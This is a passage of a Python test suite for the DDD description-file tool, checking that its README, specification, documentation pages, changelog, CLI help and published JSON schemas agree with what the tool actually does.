            ROOT / "SPEC.md": (
                "Naming a plugin runs its module",
                "reader has trusted, where the editor has such a notion",
            ),
        }
        for page, phrases in stated.items():
            text = page.read_text(encoding="utf-8")
            for phrase in phrases:
                assert phrase in text, (
                    f"{page.name} no longer states the trust boundary: {phrase!r}"
                )


class TestRunningFromTheSources:
    """20:M2. The README and the getting started page let a reader run the tool out of a checkout
    without installing it, and the page said that every command it shows works so. Without the
    runtime dependencies only the version and the help answer: ``check`` ended in a traceback,
    ``No module named 'pydantic'``. Both pages now say what is installed first, and these tests
    hold what they say of the tool without it to the tool."""

    @staticmethod
    def from_the_sources(*arguments: str) -> subprocess.CompletedProcess[str]:
        """``PYTHONPATH=src python -m ddd`` in this checkout, run by an interpreter that sees no
        installed package: ``-S`` leaves the site directories off its path, and every runtime
        dependency with them, as an environment holding nothing would."""
        return subprocess.run(
            [sys.executable, "-S", "-m", "ddd", *arguments],
            cwd=ROOT,
            env={**os.environ, "PYTHONPATH": str(ROOT / "src")},
            capture_output=True,
            text=True,
            check=False,
        )

    def test_the_interpreter_they_run_under_sees_no_dependency(self) -> None:
        """The control under the two below: an interpreter that reached pydantic would have them
        weigh nothing."""
        ran = subprocess.run(
            [sys.executable, "-S", "-c", "import pydantic"],
            capture_output=True,
            text=True,
            check=False,
        )
        assert ran.returncode != 0, "pydantic is importable without the site directories"
        assert "No module named 'pydantic'" in ran.stderr

    @pytest.mark.parametrize(
        ("arguments", "answer"),
        [(["--version"], f"ddd {__version__}\n"), (["--help"], "usage: ddd ")],
        ids=["the version", "the help"],
    )
    def test_without_its_dependencies_the_version_and_the_help_still_answer(
        self, arguments: list[str], answer: str
    ) -> None:
        ran = self.from_the_sources(*arguments)
        assert ran.returncode == 0, ran.stderr
        assert ran.stdout.startswith(answer), ran.stdout

    def test_without_them_check_fails_naming_pydantic(self) -> None:
        ran = self.from_the_sources("check", "examples/demo/demo.ddd.json")
        assert ran.returncode != 0, ran.stdout
        assert "No module named 'pydantic'" in ran.stderr

    def test_the_requirements_install_nothing_of_ddd(self) -> None:
        """What both pages have the reader install first: the runtime requirements alone, and
        nothing that installs the project from the checkout."""
        lines = [
            line.strip()
            for line in (ROOT / "requirements.txt").read_text(encoding="utf-8").splitlines()
            if line.strip() and not line.startswith("#")
        ]
        assert lines, "requirements.txt lists nothing"
        assert not [line for line in lines if line.startswith(("-e", ".", "ddd"))], lines

    def test_both_pages_say_what_is_installed_first(self) -> None:
        """What runs from the sources once the dependencies are installed, what does not
        without them, and, on the getting started page, which they are."""
        readme = flattened(README)
        started = flattened(PAGES["docs/getting_started.rst"])
        claims = {
            "the README, once": "from there the tool also runs without being installed, once its "
            "runtime dependencies are",
            "the README, without them": "Without them, `--version` and `--help` still answer, "
            "and `check` fails, naming the `pydantic` it cannot import.",
            "the README, the install": "pip install -r requirements.txt",
            "the page, once": "once the runtime dependencies ``requirements.txt`` lists are "
            "installed - which installs nothing of DDD itself",
            "the page, the install": "$ pip install -r requirements.txt # pydantic, jinja2 and "
            "pyelftools",
            "the page, without them": "Without them, the version and the help still answer, and "
            "``check`` fails, naming the ``pydantic`` it cannot import.",
            "the page, with them": "With them, ``PYTHONPATH=src python -m ddd`` and ``ddd`` are "
            "the same program invoked in two ways",
            "the page, the dependencies": "its runtime dependencies are pydantic, which parses and "
            "validates the description files, jinja2, which renders the generated artefacts, and "
            "pyelftools, which reads a linked ELF image",
            "the page, all three": "All three are installed with it",
            "the page, offline": "the wheel carries everything DDD needs apart from those three",
        }
        missing = [
            what
            for what, claim in claims.items()
            if claim not in (readme if what.startswith("the README") else started)
        ]
        assert not missing, f"the pages no longer say {missing}"
        assert "without being installed at all" not in readme
        assert "its only runtime dependencies" not in started
        installation = started.split("Installation ---", 1)[1].split(".. code-block::", 1)[0]
        for line in (ROOT / "requirements.txt").read_text(encoding="utf-8").splitlines():
            if line.strip() and not line.startswith("#"):
                name = re.split(r"[<>=!~ ]", line, maxsplit=1)[0]
                assert name in installation, f"the getting started page does not name {name}"


class TestCommandLineHelp:
    """The help strings become markup, so they have to be safe as markup."""

    def test_no_help_string_carries_markup_characters(self) -> None:
        """autoprogram inserts every help string into the reference page as rST.

        A lone asterisk opens an emphasis that never closes, a backtick opens an
        interpreted role, and a pipe opens a substitution: each is a build warning, and the
        documentation image builds with -W, so each fails the build. The text is prose meant
        for a terminal, so the rule is simply to keep those characters out of it.
        """
        offenders = []

        def walk(parser: argparse.ArgumentParser, prefix: str) -> None:
            for action in parser._actions:
                if action.help and re.search(r"[*`|]", action.help):
                    name = " ".join(action.option_strings) or action.dest
                    offenders.append(f"{prefix} {name}")
                if isinstance(action, argparse._SubParsersAction):
                    for command, sub in action.choices.items():
                        walk(sub, f"{prefix} {command}")

        walk(_build_parser(), "ddd")
        assert not offenders, (
            f"help text carrying reStructuredText inline markup: {offenders}. Rewrite it "
            f"without * ` or |, which the generated command line reference cannot escape."
        )


def record_section() -> str:
    """Section 3.6 of the specification, the build record's, and nothing of the others."""
    start = SPEC.index("### 3.6 Build record")
    return SPEC[start : SPEC.index("### 3.7 ", start)]


class TestTheRecordSaysWhereTheDescriptionCameFrom:
    """The build record's ``origin`` key, in every page that states what ``ddd gui`` does with a
    project whose record sits beside it."""

    def test_the_record_table_has_the_key_and_the_formats(self) -> None:
        rows = {
            line.split("`")[1]: line for line in record_section().splitlines() if "| `" in line[:3]
        }
        assert "description" not in rows
        assert (
            "present only for a project description given to the build as `PROJECT`"
            in (rows["origin"])
        )
        assert "`collected` is what `--origin` says for it" in rows["origin"]
        assert "`2` for a record with an `origin`" in rows["format"]
        assert "highest this version understands" in rows["format"]

    def test_the_specification_says_what_the_key_costs_and_whom(self) -> None:
        text = flattened(record_section())
        assert "The key is named `origin` and not `description`, which is a declaration's" in text
        assert "A record without the key is read as `collected`" in text
        assert "stays refused until the build is configured again" in text
        assert "A DDD from 0.11.0 on declines a record stamped past its format" in text
        assert "an older one skips it in silence" in text
        assert "so what this costs is a given description's record alone" in text
        assert "reads a record of format `1` and of format `2` alike" in text
        assert "reading it as `given` would open every build made before" in text

    def test_the_build_page_example_is_the_record_the_tool_writes(self, tmp_path: Path) -> None:
        page = PAGES["docs/build_integration.rst"]
        start = page.index(".. code-block:: json", page.index("What the build tells an editor"))
        example = json.loads(page[start:].split("\n\n", 2)[1])
        target = tmp_path / "ddd-build.json"
        arguments = ["build-info", str(ROOT / "examples/demo/demo.ddd.json"), "-o", str(target)]
        assert main([*arguments, "--image", "firmware.elf", "-W", "unused-output=info"]) == EXIT_OK
        written = json.loads(target.read_text(encoding="utf-8"))
        assert list(example) == list(written)
        assert (example["format"], example["image"], example["severity"]) == (
            written["format"],
            written["image"],
            written["severity"],
        )

    def test_the_build_page_says_what_the_key_costs_and_whom(self) -> None:
        text = flattened(PAGES["docs/build_integration.rst"])
        assert '``"origin": "given"`` and is stamped ``"format": 2``' in text
        assert "has no such key and keeps the shape of format 1" in text
        assert "a record without the key is read as collected" in text
        assert "stays refused until the build is configured again" in text
        assert "falls on ``PROJECT`` builds alone" in text
        assert (
            "a DDD from 0.11.0 on declines a record of format 2 as written by a newer DDD" in text
        )
        assert "an older one skips it in silence" in text

    def test_the_command_line_page_says_it(self) -> None:
        text = flattened(PAGES["docs/command_line_interface.rst"])
        assert "``--origin given``, written into the record, which is then format 2" in text
        assert 'is edited as any other where its record says so, ``"origin": "given"``' in text
        assert "Any other record beside a description makes it a generated one" in text
        assert "stays refused until the build is configured again" in text
        assert "tells the two apart" not in text

    def test_the_developer_page_says_it(self) -> None:
        text = flattened(PAGES["docs/developer_documentation.rst"])
        assert "What says a description is not generated is its record's ``origin`` key" in text
        assert "Any other record is the build's, a record without the key included" in text
        assert "stays refused until the build is configured again" in text
        assert "tells the two apart yet" not in text

    def test_the_help_of_the_command_says_it(self) -> None:
        said = ""
        for action in _build_parser()._actions:
            if isinstance(action, argparse._SubParsersAction):
                for action_of_command in action.choices["build-info"]._actions:
                    if "--origin" in action_of_command.option_strings:
                        said = action_of_command.help or ""
        assert "which stamps the record format 2 and which ddd gui then edits" in said
        assert "which ddd gui refuses to write into" in said

    def test_the_start_page_journey_stamps_its_record_one_past_the_format_read(self) -> None:
        """A journey that writes a record in a format too new for the start page to list it, and
        says what the page then prints: both follow ``BUILD_INFO_FORMAT``, so the next raise
        cannot leave the journey stamping a format this version reads."""
        from ddd.build_info import BUILD_INFO_FORMAT

        spec = (ROOT / "gui" / "e2e" / "start.spec.ts").read_text(encoding="utf-8")
        stamped = re.search(r'"build", \{ format: (\d+), project: join\(directory, "demo', spec)
        assert stamped is not None
        assert int(stamped.group(1)) == BUILD_INFO_FORMAT + 1
        assert (
            f"written in format {BUILD_INFO_FORMAT + 1} by a newer DDD, and this one understands "
            f"up to format {BUILD_INFO_FORMAT}"
        ) in spec


def published_kinds() -> list[str]:
    """The file formats ``ddd schema`` publishes, which is what these tests are about."""
    from ddd.cli import schema_models

    return sorted(schema_models())


def published(kind: str) -> dict[str, Any]:
    """One published schema, exactly as ``ddd schema`` writes it."""
    from ddd.cli import schema_text

    loaded: dict[str, Any] = json.loads(schema_text(kind))
    return loaded


def objects_in(schema: dict[str, Any]) -> list[tuple[str, dict[str, Any]]]:
    """Every object in a schema that has properties, named for a failure message."""
    return [("<root>", schema), *schema.get("$defs", {}).items()]


def descriptions_in(node: object) -> list[str]:
    """Every description anywhere in a schema, which is everything an editor will show."""
    if isinstance(node, dict):
        found = [node["description"]] if isinstance(node.get("description"), str) else []
        return found + [text for value in node.values() for text in descriptions_in(value)]
    if isinstance(node, list):
        return [text for value in node for text in descriptions_in(value)]
    return []


def python_names() -> set[str]:
    """Every public function and module constant of the package, by name.

    Not the classes: a model's name is often the name of the thing in the file format too -
    ``Enumerator``, ``Limits`` - and saying it is saying something a reader of the json can
    act on. A function or a constant never is.
    """
    found: set[str] = set()
    for path in (ROOT / "src" / "ddd").rglob("*.py"):
        for node in ast.parse(path.read_text(encoding="utf-8")).body:
            if isinstance(node, ast.FunctionDef):
                found.add(node.name)
            elif isinstance(node, ast.AnnAssign | ast.Assign):
                targets = [node.target] if isinstance(node, ast.AnnAssign) else node.targets
                found.update(
                    target.id
                    for target in targets
                    if isinstance(target, ast.Name) and target.id.isupper()
                )
    return {name for name in found if not name.startswith("_")}


def enumerations_in(node: object) -> list[dict[str, Any]]:
    """Every closed set of values in a schema, wherever it sits."""
    if isinstance(node, dict):
        found = [node] if isinstance(node.get("enum"), list) else []
        return found + [entry for value in node.values() for entry in enumerations_in(value)]
    if isinstance(node, list):
        return [entry for value in node for entry in enumerations_in(value)]
    return []


class TestPublishedSchemas:
    """The schemas are the editor integration, so what they carry is a promise.

    Everything here is checked against what ``ddd schema`` actually writes rather than against
    the models, because the file is what an editor reads and the two are only the same for as
    long as nothing between them drops anything.
    """

    def test_the_conversion_union_is_published_as_anyof_for_every_kind_it_has(self) -> None:
        """The generator recognises the conversion union by the kinds the union itself declares.

        A list written into the generator went stale the moment a fourth kind arrived: the
        equality failed, the union was published as ``oneOf``, and ``{}`` - which the loader
        reads as the identity - became invalid to an editor. Derived from the union, the set
        cannot lag behind it.
        """
        from ddd.models import Conversion
        from ddd.models.objects import discriminator_tags
        from ddd.models.schema import CONVERSION_KINDS

        # The set stays derived, and today's four kinds are a floor a derivation alone could
        # not hold: read from the same union, it would not notice a kind dropping out.
        assert discriminator_tags(Conversion) == CONVERSION_KINDS
        assert {"identity", "linear", "enum", "string"} <= CONVERSION_KINDS

        def unions(node: object) -> list[dict[str, object]]:
            """Every discriminated union in the published schema, wherever it sits."""
            found: list[dict[str, object]] = []
            if isinstance(node, dict):
                if "discriminator" in node:
                    found.append(node)
                found.extend(union for child in node.values() for union in unions(child))
            elif isinstance(node, list):
                found.extend(union for child in node for union in unions(child))
            return found

        conversions = [
            union
            for union in unions(published("component"))
            if set(union["discriminator"]["mapping"]) == CONVERSION_KINDS  # type: ignore[index]
        ]
        assert conversions, "the component schema publishes no conversion union"
        for union in conversions:
            assert "anyOf" in union and "oneOf" not in union
            assert len(union["anyOf"]) == len(CONVERSION_KINDS)  # type: ignore[arg-type]

    def test_the_file_roots_allow_the_editor_binding(self) -> None:
        """Every root, not a hand-kept list of them: a new file kind joins the guard by
        subclassing ``FileRoot``, instead of silently shipping without the ``$schema`` key."""
        from ddd.models.common import FileRoot

        roots = FileRoot.__subclasses__()
        # FileRoot's own docstring states this count in prose ("seven"); this assertion is
        # what keeps that stated count from rotting the way the count it replaced did.
        assert len(roots) == len(FILE_KINDS), f"expected every file root, found {roots}"
        for model in roots:
            schema = model.model_json_schema(by_alias=True)
            assert "$schema" in schema["properties"], f"{model.__name__} rejects $schema"

    @pytest.mark.parametrize("kind", published_kinds())
    def test_every_schema_states_the_dialect_it_is_written_in(self, kind: str) -> None:
        """A contract that does not say which dialect it speaks leaves a validator guessing."""
        assert published(kind)["$schema"] == "https://json-schema.org/draft/2020-12/schema"

    @pytest.mark.parametrize("kind", published_kinds())
    def test_every_schema_is_titled_for_the_person_reading_it(self, kind: str) -> None:
        """The title heads the hover, so it names the file format rather than a python class."""
        title = published(kind)["title"]
        assert title.startswith("DDD "), f"{kind} is titled {title!r}"

    @pytest.mark.parametrize("kind", published_kinds())
    def test_every_authored_field_carries_hover_documentation(self, kind: str) -> None:
        """A field without a description is a blank tooltip in every editor.

        Nothing is exempt. ``kind`` used to be, on the reading that a fixed tag has nothing
        behind it, and the four conversion tags were the only blank hovers in all eight
        published schemas - on the one key a reader typing ``"kind": "linear"`` is looking at.
        """
        undocumented = [
            f"{name}.{field}"
            for name, definition in objects_in(published(kind))
            for field, spec in definition.get("properties", {}).items()
            if "description" not in spec
        ]
        assert not undocumented, (
            f"fields with a blank editor tooltip: {undocumented}. Add an attribute "
            f"docstring; use_attribute_docstrings carries it into the schema."
        )

    @pytest.mark.parametrize("kind", published_kinds())
    def test_every_enumerated_value_says_what_it_means(self, kind: str) -> None:
        """A closed set of values is where hover documentation is worth the most.

        Which datatype to pick, or what a curve is as against a value block, is exactly the
        question an author has while typing - and the answer is already written under the
        member of the enum, so failing to carry it here throws away documentation that exists.
        """
        for enumeration in enumerations_in(published(kind)):
            values = enumeration["enum"]
            documented = enumeration.get("enumDescriptions")
            assert documented is not None, f"{values} is published with no per-value docs"
            assert len(documented) == len(values), f"{values} and its docs are not parallel"
            assert all(documented), f"{values} has a blank entry: {documented}"
            for value, text in zip(values, documented, strict=True):
                assert f"``{value}`` - {text}" in enumeration["description"], (
                    f"the description of {values} does not spell out {value!r}; the two "
                    f"spellings of the value documentation have come apart"
                )

    def test_every_kind_of_data_object_documents_its_own_tag(self) -> None:
        """``kind`` decides the shape of the whole definition, so it is the worst blank hover."""
        from ddd.models import ObjectKind

        schema = published("component")
        tagged = {
            definition["properties"]["kind"]["const"]: definition["properties"]["kind"]
            for definition in schema["$defs"].values()
            if "const" in definition.get("properties", {}).get("kind", {})
        }
        for object_kind in ObjectKind:
            assert object_kind.value in tagged, f"{object_kind.value} is not a variant"
            assert tagged[object_kind.value].get("description"), (
                f"'kind': '{object_kind.value}' hovers blank"
            )

    @pytest.mark.parametrize("kind", published_kinds())
    def test_no_description_reaches_an_editor_as_markup_it_cannot_render(self, kind: str) -> None:
        """The docstrings are written as rST for the api documentation; a schema shows markdown.

        An interpreted role left in place arrives as the literal characters ``:class:`Foo```,
        which is noise at best and, since it names something in the python sources, points a
        reader at code they do not have.
        """
        offenders = [
            text for text in descriptions_in(published(kind)) if re.search(r":\w+:`", text)
        ]
        assert not offenders, f"reStructuredText roles left in {kind}: {offenders}"

    @pytest.mark.parametrize("kind", published_kinds())
    def test_no_description_sends_the_reader_into_the_python_sources(self, kind: str) -> None:
        """Whoever reads these writes json; a dotted module path is an answer to nobody."""
        offenders = [text for text in descriptions_in(published(kind)) if "ddd.models" in text]
        assert not offenders, f"{kind} refers the reader to python: {offenders}"

    @pytest.mark.parametrize("kind", published_kinds())
    def test_no_description_names_a_python_object_of_this_package(self, kind: str) -> None:
        """The same rule as above, asked of the names rather than of the module paths.

        These strings are what an editor hovers and what ``ddd schema`` publishes, and a
        reader of them has the json in front of them and nothing else: "see ``resolve_export``"
        and "that is what ``DICTIONARY_FORMAT`` exists to make safe" point at code they do not
        have, and ``None`` is a value the document spells ``null``.
        """
        quoted = {
            name
            for text in descriptions_in(published(kind))
            for name in re.findall(r"``([A-Za-z_][A-Za-z_0-9]*)``", text)
        }
        offenders = sorted(quoted & (python_names() | {"None"}))
        assert not offenders, (
            f"{kind} hovers the names of python objects: {offenders}. Say the rule, or point "
            f"at the page that states it; write ``null`` for the json value."
        )


class TestTheShorthandsThePagesRecommend:
    """What the loader accepts, the published schema has to accept as well.

    The pages recommend ``"conversion": {}``, the mapping form of the enumerators and a bare
    unit spelling, and tell the reader to bind an editor to the schema; a schema that refused
    them underlined every recommended spelling in red while ``ddd check`` passed the file.
    """

    @staticmethod
    def accepted(kind: str, document: dict[str, Any]) -> None:
        jsonschema.validate(document, published(kind))

    def test_an_empty_conversion_is_the_identity(self) -> None:
        self.accepted(
            "component",
            {
                "component": {
                    "name": "Sensor",
                    "interface": [
                        {
                            "scope": "output",
                            "definition": {
                                "name": "Raw",
                                "kind": "measurement",
                                "datatype": "uint16",
                                "conversion": {},
                                "volatile": False,
                            },
                        }
                    ],
                }
            },
        )

    def test_enumerators_may_be_written_as_a_mapping(self) -> None:
        self.accepted(
            "component",
            {
                "component": {
                    "name": "Sensor",
                    "interface": [
                        {
                            "scope": "output",
                            "definition": {
                                "name": "Mode",
                                "kind": "measurement",
                                "datatype": "uint8",
                                "conversion": {
                                    "kind": "enum",
                                    "name": "Mode_t",
                                    "enumerators": {"MODE_OFF": 0, "MODE_RUN": 1},
                                },
                                "volatile": False,
                            },
                        }
                    ],
                }
            },
        )

    def test_a_unit_may_be_a_bare_spelling(self) -> None:
        self.accepted("units", {"units": ["Nm", "rpm", {"unit": "degC", "description": "x"}]})


class TestWhatTheLoaderRefusesTheSchemaRefusesAsWell:
    """The published schema is the first reader of a description file, so it has to agree.

    A schema that accepts what ``ddd check`` then refuses is the worse of the two answers: the
    editor says the file is fine while the build says it is not, and the author is told about
    the mistake by whoever runs the pipeline. A declared type named after a base datatype is
    the case that went unnoticed, because the published pattern carried the eleven spellings
    exactly while the loader compares them without regard to case.
    """

    @staticmethod
    def refused(kind: str, model: type[BaseModel], document: dict[str, Any]) -> None:
        with pytest.raises(ValidationError):
            model.model_validate(document)
        with pytest.raises(jsonschema.ValidationError):
            jsonschema.validate(document, published(kind))

    @pytest.mark.parametrize("name", ["uint16", "UINT16", "Uint16", "BOOLEAN", "Float64"])
    def test_a_declared_type_may_not_spell_a_base_datatype_in_any_case(self, name: str) -> None:
        from ddd.models import TypesFile

        self.refused(
            "types",
            TypesFile,
            {"types": [{"type": "scalar", "name": name, "datatype": "uint16", "conversion": {}}]},
        )

    @pytest.mark.parametrize(
        "enumerators", [{"A": 18446744073709551616}, {"1bad": 0}, {"A": 0, "no-dash": 1}]
    )
    def test_the_mapping_form_of_enumerators_publishes_its_own_rules(
        self, enumerators: dict[str, int]
    ) -> None:
        """The list form publishes the value bound and the name pattern; the shorthand did
        not, so an editor bound to the schema accepted what ``ddd check`` then refused."""
        from ddd.models import ComponentFile

        self.refused(
            "component",
            ComponentFile,
            {
                "component": {
                    "name": "Sensor",
                    "interface": [
                        {
                            "scope": "output",
                            "definition": {
                                "name": "Mode",
                                "kind": "measurement",
                                "datatype": "uint8",
                                "conversion": {
                                    "kind": "enum",
                                    "name": "Mode_t",
                                    "enumerators": enumerators,
                                },
                                "volatile": False,
                            },
                        }
                    ],
                }
            },
        )

    @pytest.mark.parametrize("name", ["uint16", "UINT16", "Uint16"])
    def test_a_typename_may_not_spell_a_base_datatype_in_any_case(self, name: str) -> None:
        from ddd.models import ComponentFile

        self.refused(
            "component",
            ComponentFile,
            {
                "component": {
                    "name": "Sensor",
                    "interface": [
                        {
                            "scope": "output",
                            "definition": {
                                "name": "Speed",
                                "kind": "measurement",
                                "typename": name,
                                "volatile": False,
                            },
                        }
                    ],
                }
            },
        )


def json_blocks(page: str) -> list[Any]:
    """Every json code block of a page that parses, as the value it holds."""
    found: list[Any] = []
    for match in re.finditer(r"\.\. code-block:: json\n\n((?:   .*\n|\n)+)", PAGES[page]):
        text = "\n".join(line[3:] for line in match.group(1).splitlines())
        try:
            found.append(json.loads(text))
        except json.JSONDecodeError:
            continue  # a fragment, shown for one key
    return found


def without_descriptions(node: Any) -> Any:
    """A schema with its documentation elided, which is how the page shows one.

    Only the prose goes: a property that happens to be called ``description`` stays.
    """
    if isinstance(node, dict):
        return {
            key: without_descriptions(value)
            for key, value in node.items()
            if not (key == "description" and isinstance(value, str))
        }
    if isinstance(node, list):
        return [without_descriptions(value) for value in node]
    return node


UNRELEASED = CHANGELOG.split("\n## ", 2)[1].split("\n", 1)[1]
"""The topmost release note, which is the one describing the tree as it stands.

While a release is being prepared that section is ``## Unreleased``; the moment it is cut the
same section carries its number and still describes this tree, until the next change puts an
``## Unreleased`` above it - which this follows on its own. An older entry describes the tree
as it stood and is held to nothing; a count or a format number that goes stale while eight
branches write into one section goes stale here.
"""

REVIEW_PHRASE = "a review of the whole tool"
"""How an entry that closes a finding of the 2026-09-15 review says where it comes from."""


class TestTheReleaseNote:
    """The unreleased entries are held to the tree they describe.

    A note is held to every claim it makes rather than required to make it: the note after a
    release starts with whatever its first change says.
    """

    def test_the_respelling_names_what_migrating_costs_for_a_boolean_too(self) -> None:
        """A description may spell a boolean ``1`` or ``0``, and a cell typed, or a table pasted,
        over such a value respells it, as it does a float array's whole numbers."""
        text = flattened(UNRELEASED)
        assert (
            "Migrating costs a diff: a table pasted over a float array whose file spells whole "
            "numbers, or spells a `float32` at double precision, rewrites that spelling, and so "
            "does a cell typed, or a table pasted, over a boolean the file spells `1` or `0`, "
            "which is rewritten `true` or `false`; the diff shows it. The values mean the same."
        ) in text

    def test_the_changelog_names_both_identifiers_of_a_name_asked_for_twice(self) -> None:
        assert (
            "A script that matched `duplicate-declaration` for a name asked for twice matches "
            "`elf-symbol-ambiguous` instead, at the same exit status."
        ) in flattened(UNRELEASED)

    def test_it_counts_the_checks_needing_every_component_as_the_registry_does(self) -> None:
        for word in project_wide_counts(UNRELEASED):
            assert NUMBER_WORDS[word.lower()] == len(project_wide_checks()), (
                f"the release note says {word} checks need every component of a project, and "
                f"{len(project_wide_checks())} do"
            )

    def test_it_counts_the_entries_the_review_of_the_whole_tool_wrote(self) -> None:
        entries = [line for line in UNRELEASED.splitlines() if line.startswith("* **")]
        found = sum(1 for entry in UNRELEASED.split("\n* **")[1:] if REVIEW_PHRASE in entry)
        stated = re.search(
            r"the (\w+) entries that follow are what that review found", flattened(UNRELEASED)
        )
        if stated is None:
            assert found == 0, (
                "entries say they answer the review, and the note does not count them"
            )
            return
        assert NUMBER_WORDS[stated.group(1)] == found, (
            f"the release note says {stated.group(1)} of its {len(entries)} entries come from "
            f"the review, and {found} of them say so"
        )

    def test_it_states_the_format_of_the_dictionary_it_ships(self) -> None:
        """Three entries tell a reader which format to expect; one bump makes all three wrong."""
        from ddd.ir import DICTIONARY_FORMAT

        stated = re.findall(
            r"(?:dictionary (?:is|stays)|still) format (\d+)", flattened(UNRELEASED)
        )
        assert {int(number) for number in stated} <= {DICTIONARY_FORMAT}, (
            f"the release note announces dictionary format {sorted(set(stated))}, and the "
            f"tool writes {DICTIONARY_FORMAT}"
        )

    def test_it_names_both_commands_that_import_pyelftools(self) -> None:
        """20:M12. The toolbox's entry said that every other command runs without importing
        pyelftools, beside the entry for ``ddd generate a2l --image``, which reads its image
        through the same reader. Held to the whole changelog rather than to the topmost section,
        since the entry stays in the section of the release that carries it."""
        said = flattened(CHANGELOG)
        assert (
            "every command but it and `ddd generate` given `--image` runs without importing it"
        ) in said
        assert "every other command runs without importing it" not in said


def exported_models() -> list[str]:
    """Every pydantic model ``ddd.models`` exports, by name and in the order it exports them."""
    import ddd.models

    return [
        name
        for name in ddd.models.__all__
        if isinstance(found := getattr(ddd.models, name), type) and issubclass(found, BaseModel)
    ]


class TestTheContractsPage:
    """ "The generated reference for every model" is held to the models there are.

    ``StringConversion`` was added to the union, to the loader, to the schemas and to the
    specification, and the page that promises the reference rendered the other three kinds and
    not it: a reader looking up what ``{"kind": "string"}`` is held to found the page that says
    it documents everything, and nothing on it. Nothing here counts the models by hand.
    """

    CONTRACTS = PAGES["docs/data_contracts.rst"]

    @pytest.mark.parametrize("name", exported_models())
    def test_every_exported_model_is_rendered(self, name: str) -> None:
        assert f"autopydantic_model:: ddd.models.{name}" in self.CONTRACTS, (
            f"ddd.models exports {name} and the contracts page does not render it; add "
            f"'.. autopydantic_model:: ddd.models.{name}' under the section it belongs to."
        )


class TestTheDictionaryPage:
    """The page shows the dictionary "exactly" as the dump writes it, so it is compared with one.

    Three format bumps added keys to every object and to the top level, and the excerpts
    stayed at the shape of format 4 while claiming to be exact.
    """

    def test_the_curve_is_shown_as_the_dump_writes_it(self) -> None:
        from ddd.cli import main

        stream = io.StringIO()
        with contextlib.redirect_stdout(stream):
            assert main(["dump", str(ROOT / "examples" / "demo" / "demo.ddd.json")]) == 0
        dumped = next(
            entry for entry in json.loads(stream.getvalue())["objects"] if entry["name"] == "CurveA"
        )
        shown = next(
            block
            for block in json_blocks("docs/data_dictionary.rst")
            if isinstance(block, dict) and block.get("name") == "CurveA" and "owner" in block
        )
        assert shown == dumped

    def test_the_top_level_of_the_schema_is_shown_as_it_is_published(self) -> None:
        """The dialect and the definitions are left out, and the prose is shortened."""
        shown = next(
            block
            for block in json_blocks("docs/data_dictionary.rst")
            if isinstance(block, dict) and "properties" in block and "$defs" not in block
        )
        expected = {key: value for key, value in published("dictionary").items() if key[0] != "$"}
        assert without_descriptions(shown) == without_descriptions(expected)


class TestTheArtefactsPage:
    """The page shows the head of the demo's a2l, which the demo writes with no address source,
    so the lines it shows under the generator's comment are the ones the file has."""

    def test_the_head_of_the_a2l_is_shown_as_it_is_written(self, tmp_path: Path) -> None:
        output = tmp_path / "gen"
        assert main(["generate", "a2l", str(DEMO), "-o", str(output)]) == EXIT_OK
        written = (output / "DemoDevice.a2l").read_text(encoding="utf-8").splitlines()
        page = PAGES["docs/generated_artefacts.rst"]
        shown = page.split("   /* DemoDevice.a2l - generated from 'DemoDevice'", 1)[1].splitlines()
        assert [line.strip() for line in shown[1:4]] == written[1:4]


def view_attributes(cls: type) -> list[str]:
    """What a template can read off a view: its fields, properties and public methods."""
    names = [field.name for field in dataclasses.fields(cls)]
    names += [name for name, value in vars(cls).items() if isinstance(value, property)]
    names += [
        name
        for name, value in vars(cls).items()
        if callable(value) and not name.startswith("_") and name not in names
    ]
    return sorted(names)


class TestTheTemplateReference:
    """The reference is what a project writes its own templates from, so it lists everything.

    ``model.structures`` reached the model a release ago and the page never mentioned it; a
    types header written from the page dropped every structure the definitions depend on.
    """

    TEMPLATES = PAGES["docs/templates.rst"]

    @pytest.mark.parametrize("name", view_attributes(CodeModel))
    def test_every_attribute_of_the_model_is_documented(self, name: str) -> None:
        assert f"``model.{name}" in self.TEMPLATES

    @pytest.mark.parametrize(
        "name",
        sorted({*view_attributes(ObjectView), *view_attributes(MemberView)}),
    )
    def test_every_attribute_of_a_view_is_documented(self, name: str) -> None:
        assert f"``.{name}" in self.TEMPLATES

    @pytest.mark.parametrize(
        ("path", "name"),
        [
            *(("conversion", name) for name in view_attributes(ConversionView)),
            *(("limits", name) for name in view_attributes(LimitsView)),
        ],
    )
    def test_every_attribute_of_the_scale_views_is_documented(self, path: str, name: str) -> None:
        assert f"``.{path}.{name}``" in self.TEMPLATES


class TestTheFivePagesTheImageReaches:
    """``--image`` reads the addresses out of a linked image, and the pages that name where an
    address comes from say so beside the map."""

    def test_the_acronyms_page_says_dwarf_is_read_and_the_address_comes_from_the_image(
        self,
    ) -> None:
        page = flattened(PAGES["docs/acronyms.rst"])
        assert "DDD does not read it" not in page
        assert "``ddd generate a2l --image`` reads it to place the addresses the a2l needs" in page
        assert (
            "It is ``0x00000000`` until the linked image (``--image``) or an address map "
            "supplies the real one."
        ) in page
        assert "even when neither an image nor an address map was given" in page

    def test_the_faq_says_a_missing_address_is_warned_and_not_silent(self) -> None:
        page = flattened(PAGES["docs/faq.rst"])
        assert "keeps address zero silently" not in page
        assert (
            "Zero is the placeholder DDD writes when a symbol is not placed by the image "
            "(``--image``) or in the address map, and it is what the whole file gets when "
            "neither is given at all"
        ) in page
        assert (
            "A symbol the map does not mention keeps address zero and is named once in the "
            "``address-missing`` warning"
        ) in page

    def test_the_getting_started_page_offers_the_image_beside_the_map(self) -> None:
        page = flattened(PAGES["docs/getting_started.rst"])
        assert (
            "``ddd generate a2l --image firmware.elf`` reads the real addresses out of the "
            "linked image's debug information"
        ) in page

    def test_the_types_page_names_the_image_as_the_source_of_member_offsets(self) -> None:
        page = flattened(PAGES["docs/file_formats/types.rst"])
        assert (
            "``--image`` reads the answer out of the linked image's debug information, member "
            "offsets included"
        ) in page


class TestWhatThePagesSayOfSymbolLink:
    """``SYMBOL_LINK`` names a linker symbol and the offset from it. With ``--image`` a member's
    names its variable and its offset; before the link, and with a map, it names the path at
    offset 0, which no linker map can answer, and a tool reading the debug information may
    resolve it, which nobody tried (finding 1:I9)."""

    BEFORE = (
        "Before the link, and with an address map, which gives a symbol's address and nothing "
        "of a member's offset, the record names the member's path at offset 0, which is a path "
        "no linker map can answer."
    )
    UNTRIED = (
        "A tool that reads the debug information of the linked image may resolve it; no such "
        "tool was tried."
    )

    def test_the_specification_says_what_an_image_and_what_a_map_gives_a_member(self) -> None:
        spec = flattened(SPEC)
        assert (
            "`SYMBOL_LINK` names the linker symbol and the offset from it, as ASAP2 defines the "
